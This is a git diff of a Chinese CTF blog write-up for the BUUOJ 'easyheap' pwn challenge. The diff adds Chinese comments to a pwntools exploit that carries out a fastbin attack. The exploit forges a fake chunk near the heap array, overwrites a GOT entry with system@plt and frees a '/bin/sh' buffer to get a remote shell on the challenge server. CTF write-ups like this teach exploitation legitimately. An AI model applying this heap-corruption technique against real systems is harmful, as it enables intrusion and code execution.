@@ -3,7 +3,7 @@ toc: true
 classes: wide
 layout: single
 title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
-date:   2021-01-03 00:10:38 +0800
+date:   2021-01-03 12:10:38 +0800
 categories: 
   - pwn
 ---
@@ -161,10 +161,6 @@ filename = './easyheap'
 # p = process(filename)
 p = remote('node3.buuoj.cn', 26098)
 elf = ELF(filename)
-# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
-# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
-# libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')
 
 
 def heap_create(content, size=None):
@@ -187,12 +183,14 @@ fake_chunk = 0x6020ad  # x/16gx 0x6020c0-0x10+5-8
 heap_create(b'@@@@@@@@', size=0x18)     # 0, 0x20
 heap_create(b'!!!!!!!!', size=0x18)     # 1, 0x20
 heap_create(b'????????', size=0x68)     # 2, 0x70
-heap_delete(2)                          # return 2 to fastbin
-heap_edit(1, b'}' * 0x18 + p64(0x71) + p64(fake_chunk) + p64(fake_chunk))  # Set fast chunk's fd
+heap_delete(2)                          # 把 2 放进去 fastbin
+heap_edit(1, b'}' * 0x18 + p64(0x71) + p64(fake_chunk) + p64(fake_chunk))  # 构造 fastbin 链表，插入一个假的chunk，这个chunk在heap_array上方若干字节处
 heap_create(b']]]]]]]]', size=0x68)     # 2, 0x70, get the original chunk of 2
 heap_create(b'[[[[[[[[', size=0x68)     # 3, 0x70, get the fake chunk
-# -_-||| cat: /home/pwn/flag: No such file or directory
+# -_-||| 看到ida里面有 system(cat flag) 还以为可以直接触发，结果。。。
+# cat: /home/pwn/flag: No such file or directory
 # heap_edit(3, b':'*(0x6020c0-0x6020bd) + p64(0x1333))
+# p.sendlineafter(b'Your choice :', bytes(f'{0x1305}', encoding='utf8'))
 
 
 # https://n0vice.top/2020/04/25/%E5%B8%B8%E8%A7%81fastbin-attack%E5%A5%97%E8%B7%AF%E5%AD%A6%E4%B9%A0/
@@ -204,6 +202,5 @@ heap_edit(0, p64(elf.plt["system"]))
 heap_edit(2, b'/bin/sh')
 heap_delete(2)
 
-# p.sendlineafter(b'Your choice :', bytes(f'{0x1305}', encoding='utf8'))
 p.interactive()
 ```
